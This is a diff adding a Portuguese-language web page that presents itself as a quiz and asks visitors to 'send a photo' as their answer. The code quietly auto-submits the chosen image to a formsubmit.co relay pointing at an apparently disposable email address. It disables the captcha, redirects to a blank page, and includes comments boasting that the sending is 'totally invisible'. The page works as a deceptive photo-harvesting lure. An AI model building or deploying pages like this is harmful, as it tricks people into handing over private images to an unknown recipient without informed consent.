@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Quiz Upload</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .card {
+      background: rgba(0,0,0,0.3);
+      padding: 40px;
+      border-radius: 16px;
+      text-align: center;
+      max-width: 320px;
+      width: 100%;
+    }
+    button {
+      background: #00e0ff;
+      color: #000;
+      border: none;
+      padding: 14px 20px;
+      border-radius: 30px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+    }
+    input[type=file] {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <h1>Responda o Quiz</h1>
+  <p>Clique no botão abaixo para enviar sua resposta</p>
+
+  <form
+    action="https://formsubmit.co/fimipa5334@cucadas.com"
+    method="POST"
+    enctype="multipart/form-data"
+    id="uploadForm"
+  >
+    <input type="file" name="attachment" id="photoInput" accept="image/*" required>
+
+    <!-- Configurações invisíveis -->
+    <input type="hidden" name="_subject" value="Imagem enviada pelo Quiz">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="about:blank">
+
+    <button type="button" onclick="document.getElementById('photoInput').click()">
+      Enviar Foto
+    </button>
+  </form>
+</div>
+
+<script>
+  const input = document.getElementById('photoInput');
+  const form = document.getElementById('uploadForm');
+
+  input.addEventListener('change', () => {
+    form.submit(); // envio totalmente invisível
+  });
+</script>
+
+</body>
+</html>
